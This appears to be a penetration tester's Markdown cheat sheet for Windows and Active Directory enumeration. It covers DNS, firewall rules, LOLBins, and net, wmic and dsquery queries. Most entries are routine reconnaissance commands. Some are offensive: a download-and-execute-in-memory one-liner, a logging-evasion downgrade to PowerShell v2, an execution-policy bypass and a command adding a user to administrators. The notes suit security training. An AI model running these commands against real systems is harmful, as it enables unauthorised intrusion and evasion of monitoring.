# Windows Network enumerations
## Enumerating the Local & remote DNS
### Local DNS resolution
```powershell
type C:\Windows\System32\drivers\etc\hosts
```
### DNS Cache
```powershell
Get-DnsClientCache | Select-Object EntryName, Data | Format-Table -AutoSize
```
```powershell
(Get-WmiObject Win32_NetworkAdapterConfiguration | Where-Object { $_.DNSServerSearchOrder -ne $null }).DNSServerSearchOrder
```
### Find the DC
```powershell
Resolve-DnsName -Name _ldap._tcp.dc._msdcs.x.stf -Type SRV
```

- View ARP cache 
```powershell
arp -a
```
- Check local Routing
```powershell
route print
```
- Identify Gateways
```powershell
ipconfig /all
```
- Active Discovery `Subnet Sweeping`
```powershell
1..254 | ForEach-Object {Test-Connection -ComputerName "10.154.32.$_" -Count 1 -Quiet -Delay 1} | Where-Object {$_}
```

## Firewall Enumerations
1. The Modern Way (PowerShell)
- List all Enabled Rules
rules that are currently active:

```PowerShell
Get-NetFirewallRule | Where-Object { $_.Enabled -eq 'True' } | Select-Object Name, DisplayName, Action, Direction
```

- Find "Allow" Rules for a Specific Port
```PowerShell
Get-NetFirewallServiceFilter | Where-Object { $_.LocalPort -eq '445' } | Get-NetFirewallRule
```
- View Rules for a Specific Direction (Inbound/Outbound)
```PowerShell
Get-NetFirewallRule -Direction Inbound -Enabled True | Select-Object DisplayName, Profile
```
2. The Legacy Way (Netsh)
- List all Active Rules
```DOS
netsh advfirewall firewall show rule name=all
```
- Check the Status of Firewall Profiles
Before looking at rules, check if the firewall is even turned on for Domain, Private, or Public profiles:
```DOS
netsh advfirewall show allprofiles
```
- Get Detailed Rule Info for a Specific Port
```DOS
netsh advfirewall firewall show rule name=all | findstr "LocalPort:445"
```
3. The Stealthy Way (WMI)
- List Rules via WMI
```PowerShell
Get-WmiObject -Class HNet_FirewallRule -Namespace ROOT\Microsoft\HomeNet
```


# LOLBINS
- print hostname 
```powershell
hostname
```
- OS version
```powershell
[System.Environment]::OSVersion.Version
```
- Patches and hotfixes
```powershell
wmic qfe get Caption,Description,HotFixID,InstalledOn
```
- network configs
```powershell
ipconfig /all
```
- list of environment variables
```cmd
set
```
- domain name and DC
```cmd
echo %USERDOMAIN%
echo %logonserver%
```
- systeminfo
```powershell
systeminfo
```
## Powershell specific
- Listing available modules
```powershell
Get-Module
```
- List execution policy per scope
```powershell
Get-ExecutionPolicy -List
```
- Temporary bypass will last until we finish our process
```powershell
Set-ExecutionPolicy Bypass -Scope Process
```
- Environment vars
```powershell
Get-ChildItem Env: | ft Key,Value
```
- powershell history
```powershell
Get-Content $env:APPDATA\Microsoft\Windows\Powershell\PSReadline\ConsoleHost_history.txt
```
- File transfer into memory
```powershell
powershell -nop -c "iex(New-Object Net.WebClient).DownloadString('URL to download the file from'); <follow-on commands>"
```
- Downgrade to powershell v2 to avoid `Script Block Logging`
```powershell
powershell.exe -version 2
```
### Firewall checks
```cmd
netsh advfirewall show allprofiles
```
### Windows Defender
```cmd
sc query windefend
```
```powershell
Get-MpComputerStatus
```
### Network information and Internal Host discovery
- Listing arp table
```cmd
arp -a
```
```cmd
route print
```
```
netsh advfirewall show allprofiles
```
####  WMI checks
wmi [Useful Wmic queries for host and domain enumeration](https://gist.github.com/xorrior/67ee741af08cb1fc86511047550cdaf4)

| **Command**                                                                          | **Description**                                                                                        |
| ------------------------------------------------------------------------------------ | ------------------------------------------------------------------------------------------------------ |
| `wmic qfe get Caption,Description,HotFixID,InstalledOn`                              | Prints the patch level and description of the Hotfixes applied                                         |
| `wmic computersystem get Name,Domain,Manufacturer,Model,Username,Roles /format:List` | Displays basic host information to include any attributes within the list                              |
| `wmic process list /format:list`                                                     | A listing of all processes on host                                                                     |
| `wmic ntdomain list /format:list`                                                    | Displays information about the Domain and Domain Controllers                                           |
| `wmic useraccount list /format:list`                                                 | Displays information about all local accounts and any domain accounts that have logged into the device |
| `wmic group list /format:list`                                                       | Information about all local groups                                                                     |
| `wmic sysaccount list /format:list`                                                  | Dumps information about any system accounts that are being used as service accounts.                   |

### **Using `net` Commands or `net1`**

| **Command**                                     | **Description**                                                                                                              |
| ----------------------------------------------- | ---------------------------------------------------------------------------------------------------------------------------- |
| `net accounts`                                  | Information about password requirements                                                                                      |
| `net accounts /domain`                          | Password and lockout policy                                                                                                  |
| `net group /domain`                             | Information about domain groups                                                                                              |
| `net group "Domain Admins" /domain`             | List users with domain admin privileges                                                                                      |
| `net group "domain computers" /domain`          | List of PCs connected to the domain                                                                                          |
| `net group "Domain Controllers" /domain`        | List PC accounts of domains controllers                                                                                      |
| `net group <domain_group_name> /domain`         | User that belongs to the group                                                                                               |
| `net groups /domain`                            | List of domain groups                                                                                                        |
| `net localgroup`                                | All available groups                                                                                                         |
| `net localgroup administrators /domain`         | List users that belong to the administrators group inside the domain (the group `Domain Admins` is included here by default) |
| `net localgroup Administrators`                 | Information about a group (admins)                                                                                           |
| `net localgroup administrators [username] /add` | Add user to administrators                                                                                                   |
| `net share`                                     | Check current shares                                                                                                         |
| `net user <ACCOUNT_NAME> /domain`               | Get information about a user within the domain                                                                               |
| `net user /domain`                              | List all users of the domain                                                                                                 |
| `net user %username%`                           | Information about the current user                                                                                           |
| `net use x: \computer\share`                    | Mount the share locally                                                                                                      |
| `net view`                                      | Get a list of computers                                                                                                      |
| `net view /all /domain[:domainname]`            | Shares on the domains                                                                                                        |
| `net view \computer /ALL`                       | List shares of a computer                                                                                                    |
| `net view /domain`                              | List of PCs of the domain                                                                                                    |

### **Dsquery**
- `dsquery` will exist on any host with the `Active Directory Domain Services Role` installed
```powershell
dsquery user
dsquery user -disabled | dsget user -desc
```
```powershell
dsquery computer
```
We can use a [dsquery wildcard search](https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/cc754232\(v=ws.11\)) to view all objects in an OU, for example.
#### Wildcard Search
```
dsquery * "CN=Users,DC=INLANEFREIGHT,DC=LOCAL"
```
#### Users With Specific Attributes Set (PASSWD_NOTREQD)

```powershell
dsquery * -filter "(&(objectCategory=person)(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=32))" -attr distinguishedName userAccountControl
```

#### Searching for Domain Controllers
```powershell
dsquery * -filter "(userAccountControl:1.2.840.113556.1.4.803:=8192)" -limit 5 -attr sAMAccountName
```
- ![[Pasted image 20260313150732.png]]
#### LDAP querying **UserAccountControl** UAC
##### OID matching rules
1. `1.2.840.113556.1.4.803`:
	1. Only results that match all the flags in our mask
2. `1.2.840.113556.1.4.803`:
	1. Show results that match at least one of the mask bits
3. `1.2.840.113556.1.4.1941`:
	1. Recursive search in the ownerships and membership entries in the Objects Distinguished name
- We can use logical operators `| & !`
```powershell
dsquery * -filter "(&(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=2))" -limit 5 -attr sAMAccountName distinguishedName
```
